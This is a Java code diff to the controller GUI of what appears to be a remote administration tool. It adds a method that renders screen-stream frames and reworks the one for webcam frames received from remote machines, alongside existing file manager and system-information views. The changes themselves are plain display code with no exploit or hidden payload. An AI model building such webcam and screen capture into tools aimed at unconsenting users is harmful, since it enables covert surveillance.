@@ -2,6 +2,7 @@ package Connections;
 
 import GUI.Main;
 import GUI.TableUtils.FileManager.FileManagerGUI;
+import GUI.TableUtils.ScreenStreaming.ScreenStreamingGUI;
 import GUI.TableUtils.Webcam.WebcamManager.WebcamGUI;
 import Information.NetworkInformation;
 import Information.SystemInformation;
@@ -11,7 +12,7 @@ import org.json.JSONObject;
 import javax.swing.*;
 import javax.swing.table.DefaultTableModel;
 import javax.swing.table.TableModel;
-import java.sql.SQLOutput;
+import java.awt.*;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
@@ -26,6 +27,8 @@ public class Updater {
     private FileManagerGUI fileManagerGUI;
 
     private WebcamGUI webcamGUI;
+
+    private ScreenStreamingGUI screenStreamerGUI;
 
     private void convertJSON2NetAndSysInfo(JSONObject jsonObject) {
         String operatingSystem = jsonObject.getString("win_ver");
@@ -168,8 +171,20 @@ public class Updater {
 
     }
 
-    void updateFrameOfWebcam() {
+    void updateFrameOfWebcamStreamer(byte[] data) {
+        SwingUtilities.invokeLater(() -> {
+            ImageIcon tempIMG = new ImageIcon(data);
+            webcamGUI.getWebcamLabel().setIcon(tempIMG);
+        });
+    }
 
+    public void updateFrameOfScreenStreamer(byte[] finalData) {
+        ImageIcon tempIMG = new ImageIcon(finalData);
+        Image img = tempIMG.getImage();
+        Image imgScale = img.getScaledInstance(screenStreamerGUI.getDialog().getWidth(), screenStreamerGUI.getDialog().getHeight(), Image.SCALE_SMOOTH);
+        SwingUtilities.invokeLater(() -> {
+            screenStreamerGUI.getStreamingScreenShower().setIcon(new ImageIcon(imgScale));
+        });
     }
 
 
@@ -180,4 +195,10 @@ public class Updater {
     public void setWebcamGUI(WebcamGUI webcamGUI) {
         this.webcamGUI = webcamGUI;
     }
+
+    public void setScreenStreamerGUI(ScreenStreamingGUI screenStreamerGUI) {
+        this.screenStreamerGUI = screenStreamerGUI;
+    }
+
+
 }
